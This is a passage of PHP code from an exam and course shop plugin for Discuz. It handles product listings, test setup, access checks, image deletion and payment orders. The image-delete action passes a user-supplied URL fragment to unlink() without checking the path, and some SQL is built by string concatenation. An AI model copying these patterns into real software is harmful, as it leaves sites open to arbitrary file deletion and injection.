						if(C::t('#it618_exam#it618_exam_goods_type')->counttype_by_pid_ok($it618_exam_goods['id'])>0){
							//$jfbl='<div class="divjfbl">'.$it618_exam_lang['s1371'].str_replace(".00","",$it618_exam_goods['it618_jfbl']).'%'.$creditname.'</div>';
						}else{
							//$jfbl='<div class="divjfbl">'.$it618_exam_lang['s1371'].intval($it618_exam_goods['it618_saleprice']*$it618_exam_goods['it618_jfbl']/100).$creditname.'</div>';
						}
					}
					
					$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
					$home_goodstmp.='<div class="course-card" title="'.$it618_exam_goods['it618_name'].'">
										'.$jfbl.'
										<div class="course-img">
											<a href="'.$tmpurl.'" target="_blank"><img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" alt="'.$it618_exam_goods['it618_name'].'" class="goodsimg"></a>
											<div class="course-name">
												<a href="'.$tmpurl.'" target="_blank">'.cutstr($it618_exam_goods['it618_name'],58,'...').'</a>
											</div>
											<div class="course-author">
												'.$it618_isvip.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'
												<a href="'.$tmpurl.'" target="_blank" title="'.$it618_exam_shop['it618_name'].'">'.cutstr($it618_exam_shop['it618_name'],18,'...').'</a>
											</div>
											<div class="course-price">
												'.$pricestr.'
												<span class="course-plays">'.$it618_exam_goods['it618_tests'].''.it618_exam_getlang('s931').'</span>
											</div>
										</div>
									</div>';
				}
				
				if($i%5==0)$home_goodstmp.='</li>';
				$i=$i+1;
			}
		}
		if(($i-1)%5>0)$home_goodstmp.='</li>';
		
		if($templatename=='default'){
			$home_goodstmp='<div id="'.$_GET['ac1'].'">
							<div class="swiper-container">
								<div class="swiper-wrapper">'.$home_goodstmp.'</div>	
								<div class="pagination pagination-top"></div>
								<div class="button-prev page-btn swiper-button-prev"></div>
								<div class="button-next page-btn swiper-button-next"></div>
							</div>
						</div>';
		}
		
		echo $home_goodstmp;exit;

	}else{
		$home_goodstmp='';
		$width=135;
		while($it618_homegoods = DB::fetch($query)) {
			$it618_exam_goods=C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_homegoods['it618_pid']);
			
			if(!it618_exam_issecretok($it618_exam_goods)){
				continue;
			}
			
			if($it618_exam_goods['it618_saleprice']>0||$it618_exam_goods['it618_score']>0){
				$pricestr=it618_exam_getgoodsprice($it618_exam_goods,'goods_price');
			}else{
				$pricestr='<span style="color:#390">'.$it618_exam_lang['s106'].'</span>';
			}
			
			$pricestr='<span>'.$pricestr.'</span>';
			
			if($_GET['ac1']=='zjsalegoods'){
						if($IsPinEdu==1){
							if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_price_by_it618_shoptype_pid('exam',$it618_exam_goods['id'])){
								if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_score_by_it618_shoptype_pid('exam',$it618_exam_goods['id'])){
								}
							}
							$it618_pinedu_goods['it618_saleprice']=$it618_pinedu_goods['it618_price'];
							$pricestr='<img src="source/plugin/it618_pinedu/images/goodspin.png" style="height:15px; margin-right:6px;margin-top:-3px;display:inline-table"><span style="color:red">'.it618_exam_getgoodsprice($it618_pinedu_goods,'goods_price').'</span>';
						}
					}

			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			
			$home_goodstmp.='<td width="'.$width.'"><a href="'.$tmpurl.'">
								<img width="'.$width.'" src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'"/>
								<div class="tdname">'.$it618_exam_goods['it618_name'].'</div>
								<div class="tdprice">'.$pricestr.'</div>
							</a>
							</td>';
		}
		echo '<tr>'.$home_goodstmp.'</tr>';exit;
	}
}

if($_GET['formhash']!=FORMHASH)exit; /*DISM - TAOBAO - COM */

if($_GET['ac']=="utestadd"){
	$shopid=intval($_GET['shopid']);
	if($uid>0){
		if($shopid>0){
			echo 'it618_splitok';exit;
		}
		
		$errcount=C::t('#it618_exam#it618_exam_errquestions')->count_by_search('', '', '', $uid);
		if($errcount>0){
			if($it618_exam_utest_exam=C::t('#it618_exam#it618_exam_utest_exam')->fetch_by_shopid_uid_state12($shopid,$uid)){
				echo 'it618_splittest';exit;
			}else{
				set_time_limit (0);
				ignore_user_abort(true);
		
				$eid=C::t('#it618_exam#it618_exam_utest_exam')->insert(array(
					'it618_uid' => $uid,
					'it618_shopid' => $shopid,
					'it618_answertype' => $_GET['answertype'],
					'it618_examtime' => $_GET['examtime'],
					'it618_btime' => $_G['timestamp'],
					'it618_etime' => $_G['timestamp']+$_GET['examtime']*60,
					'it618_state' => 1
				), true);
				
				if($shopid==0){
					$query1 = DB::query("SELECT * FROM ".DB::table('it618_exam_errquestions')." WHERE it618_uid=".$uid." ORDER BY RAND() LIMIT ".intval($_GET['questioncount']));
				}
				
				$n=0;
				while($it618_questions = DB::fetch($query1)) {
					C::t('#it618_exam#it618_exam_utest_exam_questions')->insert(array(
						'it618_eid' => $eid,
						'it618_qid' => $it618_questions['it618_qid']
					), true);
					$n=$n+1;
				}
				
				DB::query("update ".DB::table('it618_exam_utest_exam')." set it618_questioncount=".$n." where id=$eid");
				
				echo 'it618_splitok';exit;
				
			}
		}else{
			echo $it618_exam_lang['s1393'];exit;
		}
	}
	echo $it618_exam_lang['s513'];exit;
}


if($_GET['ac']=="gettestabout"){
	$pid=intval($_GET['pid']);
	
	if($uid>0){
		if(!($it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id_state($pid,1))){
			echo it618_exam_getlang('s470');exit;
		}
		
		$it618_exam_shop = C::t('#it618_exam#it618_exam_shop')->fetch_by_id($it618_exam_goods['it618_shopid']);
		if($it618_exam_shop['it618_state']!=2||$it618_exam_shop['it618_htstate']!=1){
			echo it618_exam_getlang('s470');exit;
		}
		
		if($it618_exam_test_exam=C::t('#it618_exam#it618_exam_test_exam')->fetch_by_pid_uid_state12($pid,$uid)){
			echo 'it618_splitok';exit;
		}
		
		if($it618_exam_goods['it618_gtype']==1){
			if(!it618_exam_issecretok($it618_exam_goods)){
				echo it618_exam_getlang('s470');exit;
			}
			
			if(C::t('#it618_exam#it618_exam_goods_type')->counttype_by_pid_ok($pid)==0){
				dsetcookie('it618_exam_testabout'.$pid,1,300);
				echo 'it618_splitok';exit;
			}
			
			$it618_video = $_G['cache']['plugin']['it618_video'];
			if($it618_video['seotitle']!=''){
				$query = DB::query("SELECT * FROM ".DB::table('it618_video_goods_lesson_exam')." WHERE it618_power=1 and it618_tid=".$pid);
				while($it618_video_goods_lesson_exam = DB::fetch($query)) {
					$isvideopower=it618_exam_getvideopower($it618_video_goods_lesson_exam['it618_pid'],$it618_video_goods_lesson_exam['it618_lid']);
					if($isvideopower==1){
						dsetcookie('it618_exam_testabout'.$pid,1,300);
						echo 'it618_splitok';exit;
					}
				}
			}

			$vipgroupids=it618_exam_getgoodsvipgroupids($it618_exam_goods);
	
			$exampower=it618_exam_getpower($uid,$pid);
			if($exampower['state']==1){
				dsetcookie('it618_exam_testabout'.$pid,1,300);
				echo 'it618_splitok';exit;
			}
			
			if(count($vipgroupids)>0){
				$tmpgrouparr=it618_exam_getisvipuser($vipgroupids);
				$isvipuser=count($tmpgrouparr[0]);
	
				if($isvipuser>0){
					dsetcookie('it618_exam_testabout'.$pid,1,300);
					echo 'it618_splitok';exit;
				}
				
				echo it618_exam_getlang('s826');exit;
			}else{
				echo it618_exam_getlang('s824');exit;
			}
		}else{
			if($it618_exam_goods['it618_chkstate']!=4){
				echo it618_exam_getlang('s1515');exit;
			}
			
			$tmptime2=strtotime($it618_exam_goods['it618_xgtime1'])+$it618_exam_goods['it618_examtime']*60;
			$it618_exam_goods['it618_xgtime2']=date('Y-m-d H:i', $tmptime2);
			
			$timetmp1=explode(" ",$it618_exam_goods['it618_xgtime1']);
			$timetmp2=explode(" ",$it618_exam_goods['it618_xgtime2']);
			$timetmp11=explode("-",$timetmp1[0]);
			$timetmp12=explode(":",$timetmp1[1]);
			$timetmp21=explode("-",$timetmp2[0]);
			$timetmp22=explode(":",$timetmp2[1]);
			
			$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
			$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
			
			$timeflag=1;
			if($etime<$_G['timestamp']){
				echo it618_exam_getlang('s1516');exit;
			}else{
				if($btime>$_G['timestamp']){
					echo it618_exam_getlang('s1517');exit;
				}
			}
			
			if(!$it618_exam_goods_user=C::t('#it618_exam#it618_exam_goods_user')->fetch_by_pid_uid($pid,$uid)){
				echo it618_exam_getlang('s1518');exit;
			}
			
			if($it618_exam_goods_user['it618_eid']>0){
				echo it618_exam_getlang('s1519');exit;
			}
			
			if($it618_exam_goods_user['it618_pici']!=$it618_exam_goods['it618_pici']){
				echo it618_exam_getlang('s1520');exit;
			}
			
			dsetcookie('it618_exam_testabout'.$pid,1,300);
			echo 'it618_splitok';exit;
		}
	}
}


if($_GET['ac']=="imgdelete"){
	if($uid<=0){
		echo '0';
	}else{
		$shopid=intval($_GET['shopid']);
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		if($shopid==0){
			$shopadmin=explode(",",$it618_exam['exam_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo '0';exit;
			}
		}else{
			$it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_id($shopid);
			if($it618_exam_shop['it618_uid']!=$uid){
				echo '0';exit;
			}
		}
		if($shopid==0){
			$tmparr=explode('source/plugin/it618_exam/kindeditor/attached/image/',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/attached/image/'.$tmparr[1];
			}
			$tmparr=explode('source/plugin/it618_exam/kindeditor/data/shop',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/data/shop'.$tmparr[1];
			}
		}else{
			$tmparr=explode('source/plugin/it618_exam/kindeditor/data/shop'.$shopid.'/',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/data/shop'.$shopid.'/'.$tmparr[1];
			}
		}
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		if (file_exists($delpath)) {
			$result=unlink($delpath);
			if(it618_exam_dirsize(dirname($delpath))==0){
				rmdir(dirname($delpath));
			}
			
			echo '1';
		}else{
			echo '0';
		}
	}
	exit;
}


if($_GET['ac']=="salesd_add"){
	if($uid<=0){
		echo it618_exam_getlang('s485');
	}else{
		$sd_userpower=C::t('#it618_exam#it618_exam_set')->getsetvalue_by_setname('sd_userpower');
		$sd_saleuser=C::t('#it618_exam#it618_exam_set')->getsetvalue_by_setname('sd_saleuser');
		$sd_isgoodstime=C::t('#it618_exam#it618_exam_set')->getsetvalue_by_setname('sd_isgoodstime');

		$sd_userpowerarr=explode(",",$sd_userpower);
		if(!in_array($uid,$sd_userpowerarr)){
			echo $it618_exam_lang['s1058'];exit;
		}
		
		if($sd_saleuser==''){
			echo $it618_exam_lang['s1059'];exit;
		}
		$sd_saleuserarr=explode(",",$sd_saleuser);
		$arrindex=array_rand($sd_saleuserarr);
		$uid=$sd_saleuserarr[$arrindex];
		
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$pid=intval($_GET['pid']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_count=intval($_GET['it618_count']);

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		if(!($it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id_state($pid,1))){
			echo it618_exam_getlang('s487');exit;
		}
		
		if(C::t('#it618_exam#it618_exam_goods_type')->counttype_by_pid_ok($pid)>0){
			if($it618_gtypeid==0){
				echo it618_exam_getlang('s1136');exit;
			}
		}else{
			echo it618_exam_getlang('t2');exit;
		}
		
		if($it618_gtypeid>0){
			if($it618_exam_goods_type=C::t('#it618_exam#it618_exam_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_count=$it618_exam_goods_type['it618_count'];
				$goods_price=$it618_exam_goods_type['it618_saleprice'];
				$goods_jfid=$it618_exam_goods_type['it618_jfid'];
				$goods_score=$it618_exam_goods_type['it618_score'];
			}else{
				echo it618_exam_getlang('s1137');exit;
			}
			
			if($it618_count>$goods_count){
				echo it618_exam_getlang('s1138');exit;
			}
		}else{
			$goods_count=$it618_exam_goods['it618_count'];
			$goods_price=$it618_exam_goods['it618_saleprice'];
			$goods_jfid=$it618_exam_goods['it618_jfid'];
			$goods_score=$it618_exam_goods['it618_score'];
		}

		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		if($ii1i11i[9]!='m')exit;
		$id = C::t('#it618_exam#it618_exam_sale')->insert(array(
			'it618_shopid' => $it618_exam_goods['it618_shopid'],
			'it618_uid' => $uid,
			'it618_pid' => $pid,
			'it618_gtypeid' => $it618_gtypeid,
			'it618_count' => $it618_count,
			'it618_price' => $goods_price,
			'it618_state' => 1,
			'it618_time' => $_G['timestamp']
		), true);
		
		C::t('#it618_exam#it618_exam_goods')->update_it618_tests_by_id($it618_exam_goods['id']);
		
		$it618_exam_sale=C::t('#it618_exam#it618_exam_sale')->fetch_by_id($id);
		it618_exam_updategoodscount($it618_exam_sale);
		
		if($sd_isgoodstime==1){
			it618_exam_qrxf($id);
		}

		echo 'ok';it618_exam_delsalework();
	}
	
	exit;
}


if($_GET['ac']=="pay_add"){
	if($uid<=0){
		echo it618_exam_getlang('s485');
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		
		
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_exam_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_exam_delsalework();
			}
		}
		C::t('#it618_exam#it618_exam_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$pid=intval($_GET['pid']);
		$it618_jfid=intval($_GET['it618_jfid']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_count=intval($_GET['it618_count']);
		
		if($IsUnion==1&&$_GET['tuijcode']!=''){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
			$it618_tuijid=Union_IsTuiJoin('exam',$pid,$_GET['tuijcode']);
		}
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		if($it618_exam['exam_certtype']==1){
			if(C::t('#it618_members#it618_members_rzuser')->count_by_uid_rzok($uid)==0){
				echo $it618_exam['exam_certtip'];it618_exam_delsalework();exit;
			}
		}
		
		if($it618_exam['exam_certtype']==2){
			$tmparr=explode("|",trim($it618_exam['exam_cert']));
			$tmparr[0]=str_replace('pre_','',$tmparr[0]);
			if(DB::result_first("SELECT count(1) FROM ".DB::table($tmparr[0])." where ".$tmparr[1]."='".$tmparr[2]."' and ".$tmparr[3]."=".$uid)==0){
				echo $it618_exam['exam_certtip'];it618_exam_delsalework();exit;
			}
		}
		
		if($it618_count<=0){
			echo it618_exam_getlang('s1135');it618_exam_delsalework();exit;
		}
		
		if(!($it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id_state($pid,1))){
			echo it618_exam_getlang('s487');it618_exam_delsalework();exit;
		}
		
		if(!it618_exam_issecretok($it618_exam_goods)){
			echo it618_exam_getlang('s487');it618_exam_delsalework();exit;
		}
		
		if($IsGroup==1){
			$salepower=it618_exam_groupsalepower($pid);
			if($salepower==1){
				echo it618_exam_getlang('s1554');it618_exam_delsalework();exit;
			}
			if($salepower==2){
				echo it618_exam_getlang('s1555');it618_exam_delsalework();exit;
			}
		}
		
		if(C::t('#it618_exam#it618_exam_goods_type')->counttype_by_pid_ok($pid)>0){
			if($it618_gtypeid==0){
				echo it618_exam_getlang('s1136');it618_exam_delsalework();exit;
			}
		}else{
			echo it618_exam_getlang('t2');it618_exam_delsalework();exit;
		}
		
		if($it618_gtypeid>0){
			if($it618_exam_goods_type=C::t('#it618_exam#it618_exam_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_count=$it618_exam_goods_type['it618_count'];
				$goods_price=$it618_exam_goods_type['it618_saleprice'];
				$goods_jfid=$it618_exam_goods_type['it618_jfid'];
				$goods_score=$it618_exam_goods_type['it618_score'];
			}else{
				echo it618_exam_getlang('s1137');it618_exam_delsalework();exit;
			}
			
			if($it618_count>$goods_count){
				echo it618_exam_getlang('s1138');it618_exam_delsalework();exit;
			}
			
			if($it618_exam_goods_type['it618_xgtime']==0){
				$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_exam_sale')." where it618_gtypeid=".$it618_gtypeid." and it618_state=1 and it618_uid=".$uid);
			}else{
				$time=$_G['timestamp']-$it618_exam_goods_type['it618_xgtime']*3600*24;
				
				$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_exam_sale')." where it618_gtypeid=".$it618_gtypeid." and it618_time>$time and it618_state=1 and it618_uid=".$uid);
			}
			if($buycount=='')$buycount=0;
			
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			if($it618_exam_goods_type['it618_xgcount']>0&&$it618_count>$it618_exam_goods_type['it618_xgcount']-$buycount){
				if($it618_exam_goods_type['it618_xgtime']==0){
					echo it618_exam_getlang('s1139').$it618_exam_goods_type['it618_xgcount'].it618_exam_getlang('s1140').$buycount.it618_exam_getlang('s1141');it618_exam_delsalework();exit;
				}else{
					echo it618_exam_getlang('s1142').$it618_exam_goods_type['it618_xgtime'].it618_exam_getlang('s1143').$it618_exam_goods_type['it618_xgcount'].it618_exam_getlang('s1140').$buycount.it618_exam_getlang('s1141');it618_exam_delsalework();exit;
				}
			}
		}else{
			$goods_count=$it618_exam_goods['it618_count'];
			$goods_price=$it618_exam_goods['it618_saleprice'];
			$goods_jfid=$it618_exam_goods['it618_jfid'];
			$goods_score=$it618_exam_goods['it618_score'];
		}
		
		if($it618_exam_goods['it618_xgtype']==1){
			
			$timetmp1=explode(" ",$it618_exam_goods['it618_xgtime1']);
			$timetmp2=explode(" ",$it618_exam_goods['it618_xgtime2']);
			$timetmp11=explode("-",$timetmp1[0]);
			$timetmp12=explode(":",$timetmp1[1]);
			$timetmp21=explode("-",$timetmp2[0]);
			$timetmp22=explode(":",$timetmp2[1]);
			
			
			$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
			$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
			
			if($etime<$_G['timestamp']){
				echo $it618_exam_lang['s1055'];it618_exam_delsalework();exit;
			}else{
				if($btime>$_G['timestamp']){
					echo $it618_exam_lang['s1056'];it618_exam_delsalework();exit;
				}
			}
		}
		
		if($it618_exam_goods['it618_xgtype']==2){
			$timetmp1=explode(" ",$it618_exam_goods['it618_xgtime1']);
			$timetmp2=explode(" ",$it618_exam_goods['it618_xgtime2']);
			$timetmp11=explode("-",$timetmp1[0]);
			$timetmp12=explode(":",$timetmp1[1]);
			$timetmp21=explode("-",$timetmp2[0]);
			$timetmp22=explode(":",$timetmp2[1]);
			
			$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
			$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
			
			if($etime<$_G['timestamp']){
				echo $it618_exam_lang['s1055'];it618_exam_delsalework();exit;
				
			}else{
				if($btime>$_G['timestamp']){
					echo $it618_exam_lang['s1056'];it618_exam_delsalework();exit;
				}else{
					$btimecur=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j'), date('Y'));
					$btimecur1=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j')+1, date('Y'));
					$etimecur=mktime($timetmp22[0], $timetmp22[1], 0, date('n'), date('j'), date('Y'));
					
					if($btimecur>$_G['timestamp']){
						echo $it618_exam_lang['s1056'];it618_exam_delsalework();exit;
					}
					
					if($etimecur<$_G['timestamp']){
						echo $it618_exam_lang['s1056'];it618_exam_delsalework();exit;
					}
				}
			}
		}

		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		if($it618_exam_goods['it618_jfbl']>0){
			$it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_id($it618_exam_goods['it618_shopid']);
			$creditnum=C::t('#it618_exam#it618_exam_sale')->fetch_extcredits_by_uid($it618_exam['exam_credit'],$it618_exam_shop['it618_uid']);
			if($creditnum=="")$creditnum=0;
	
			if($creditnum<$it618_exam_shop['it618_score']){
				$shopname=$it618_exam_shop['it618_name'];
				$tmpstr=str_replace("{shopname}",$shopname,it618_exam_getlang('s1084'));
				$tmpstr=str_replace("{creditname}",$creditname,$tmpstr);
				echo $tmpstr;it618_exam_delsalework();exit;
			}
		}
		
		if($IsGroup==1){
			$vipzk=it618_exam_getvipzk($pid);
		}
		
		if($vipzk>0){
			$yfmoney=round($goods_price*$it618_count*$vipzk/100,2);
		}else{
			$yfmoney=$goods_price*$it618_count;
		}
		
		if($goods_score>0){
			$goodsjfname=$_G['setting']['extcredits'][$goods_jfid]['title'];
			
			if($vipzk>0){
				$yfscore=intval($goods_score*$it618_count*$vipzk/100);
			}else{
				$yfscore=$goods_score*$it618_count;
			}

			$creditnum=DB::result_first("select extcredits".$goods_jfid." from ".DB::table('common_member_count')." where uid=".$_G['uid']);
			if($creditnum<$yfscore){
				echo it618_exam_getlang('s1121').$creditnum.$goodsjfname.it618_exam_getlang('s1122');it618_exam_delsalework();exit;
			}
		}
		
		$quanid=intval($_GET['quanid']);
		if($quanid>0){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
			$it618_union_quansale = C::t('#it618_union#it618_union_quansale')->fetch_by_id($quanid);
			if(it618_union_getisokquan($it618_union_quansale,$it618_exam_goods['id'],$yfmoney)==''){
				echo $it618_union_lang['s319'];it618_exam_delsalework();exit;
			}
			$it618_quanmoney=it618_union_getquantype($it618_union_quansale,'quanmoney');
			if($yfmoney<$it618_quanmoney){
				$it618_quanmoney=$yfmoney;
			}
			$yfmoney=$yfmoney-$it618_quanmoney;
		}
		
		if($yfmoney>0){
			if($_GET['paytype']==""){
				echo it618_exam_getlang('s1069');it618_exam_delsalework();exit;
			}
			
			$it618_state=0;
		}else{
			$it618_state=1;
		}
		
		if($ii1i11i[9]!='m')exit;
		$tmptime=$_G['timestamp'];
		$id = C::t('#it618_exam#it618_exam_sale')->insert(array(
			'it618_shopid' => $it618_exam_goods['it618_shopid'],
			'it618_uid' => $uid,
			'it618_pid' => $pid,
			'it618_gtypeid' => $it618_gtypeid,
			'it618_tuijid' => $it618_tuijid,
			'it618_count' => $it618_count,
			'it618_price' => $goods_price,
			'it618_jfid' => $goods_jfid,
			'it618_score' => $goods_score,
			'it618_quanmoney' => $it618_quanmoney,
			'it618_vipzk' => $vipzk,
			'it618_sfmoney' => $yfmoney,
			'it618_sfscore' => $yfscore,
			'it618_jfbl' => $it618_exam_goods['it618_jfbl'],
			'it618_tel' => it618_exam_utftogbk($_GET["it618_tel"]),
			'it618_state' => $it618_state,
			'it618_time' => $tmptime
		), true);

		if($id>0){
			if($yfscore>0){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$goods_jfid => (0-$yfscore))
				);
			}
			
			if($quanid>0){
				DB::query("update ".DB::table('it618_union_quansale')." set it618_saleid=$id,it618_usetime=$tmptime,it618_state=1 where id=".$quanid);
			}
			
			if($yfmoney==0){
				if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
				if($it618_tuijid>0){
					require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
					Union_TuiTC_Add($it618_tuijid,$id);
				}
				$it618_exam_sale = C::t('#it618_exam#it618_exam_sale')->fetch_by_id($id);
				it618_exam_updategoodscount($it618_exam_sale);
				it618_exam_qrxf($id);
				
				it618_exam_sendmessage('sale_user',$id);
				it618_exam_sendmessage('sale_shop',$id);
				it618_exam_sendmessage('sale_admin',$id);
				
				echo 'it618_splitjfokit618_split';it618_exam_delsalework();exit;	
			}
			
			$saletype='0501';
			$saleid=$id;
			$out_trade_no = date("YmdHis").$saletype.$saleid;
			
			$body=$it618_exam_goods["it618_name"];
			
			$total_fee=$yfmoney;
			
			if(exam_is_mobile()){ 
				$wap=1;
				$url=$_G['siteurl'].it618_exam_getrewrite('exam_wap','product@'.$pid,'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$pid);
			}else{
				$wap=0;
				$url=$_G['siteurl'].it618_exam_getrewrite('exam_product',$pid,'plugin.php?id=it618_exam:product&pid='.$pid);
			}
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
			$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
			$tmparr=explode("it618_split",$domainurl_paytype);
			$domainurl=$tmparr[0];
			$paytype=$tmparr[1];

			C::t('#it618_credits#it618_credits_salepay')->insert(array(
				'it618_out_trade_no' => $out_trade_no,
				'it618_uid' => $uid,
				'it618_saletype' => $saletype,
				'it618_saleid' => $saleid,
				'it618_paytype' => $paytype,
				'it618_url' => $url,
				'it618_body' => $body,
				'it618_total_fee' => round($total_fee,2),
				'it618_plugin' => 'it618_exam',
				'it618_wap' => $wap,
				'it618_state' => 0,
				'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);
		
			$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
			
			
			echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;it618_exam_delsalework();
		}else{
			echo it618_exam_getlang('s498');it618_exam_delsalework();exit;
		}
	}
	exit;
}


if($_GET['ac']=="gwcpay_add"){
	if($uid<=0){
		echo it618_exam_getlang('s484');
	}else{
		$count=C::t('#it618_exam#it618_exam_gwc')->count_by_uid_state($uid);
		if($count>0){
			echo $it618_exam_lang['s1799'];exit;
		}
		set_time_limit (0);
		ignore_user_abort(true);

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_exam_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_exam_delsalework();
			}
		}
		C::t('#it618_exam#it618_exam_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		
		if($it618_exam['exam_certtype']==1){
			if(C::t('#it618_members#it618_members_rzuser')->count_by_uid_rzok($uid)==0){
				echo $it618_exam['exam_certtip'];it618_exam_delsalework();exit;
			}
		}
		
		if($it618_exam['exam_certtype']==2){
			$tmparr=explode("|",trim($it618_exam['exam_cert']));
			$tmparr[0]=str_replace('pre_','',$tmparr[0]);
			if(DB::result_first("SELECT count(1) FROM ".DB::table($tmparr[0])." where ".$tmparr[1]."='".$tmparr[2]."' and ".$tmparr[3]."=".$uid)==0){
				echo $it618_exam['exam_certtip'];it618_exam_delsalework();exit;
			}
		}
		
		$exam_gwcpcount=$it618_exam['exam_gwcpcount'];
		
		$count=C::t('#it618_exam#it618_exam_gwc')->count_by_uid($uid);
		if($count==0){
			echo it618_exam_getlang('s1081');it618_exam_delsalework();exit;
		}else if($count>$exam_gwcpcount){
			echo str_replace("gwcpcount",$exam_gwcpcount,it618_exam_getlang('s1082'));it618_exam_delsalework();exit;
		}
		
		foreach(C::t('#it618_exam#it618_exam_gwc')->fetch_all_shopid_by_uid($uid) as $shopids) {
			$it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_id($shopids['it618_shopid']);
			$shopid=$it618_exam_shop['id'];
			$shopname=$it618_exam_shop['it618_name'];
			$shopnamestr=str_replace("{shopname}",$shopname,it618_exam_getlang('s1085'));
			$it618_state=$it618_exam_shop['it618_state'];
			
			if($it618_state==0){
				echo str_replace(it618_exam_getlang('s1086'),$shopnamestr,it618_exam_getlang('s1087'));it618_exam_delsalework();exit;
			}elseif($it618_state==1){
				echo str_replace(it618_exam_getlang('s1086'),$shopnamestr,it618_exam_getlang('s1087'));it618_exam_delsalework();exit;
			}else{
				$it618_htstate=$it618_exam_shop['it618_htstate'];
				if($it618_htstate==0){
					echo str_replace(it618_exam_getlang('s1086'),$shopnamestr,it618_exam_getlang('s1088'));it618_exam_delsalework();exit;
				}elseif($it618_htstate==2){
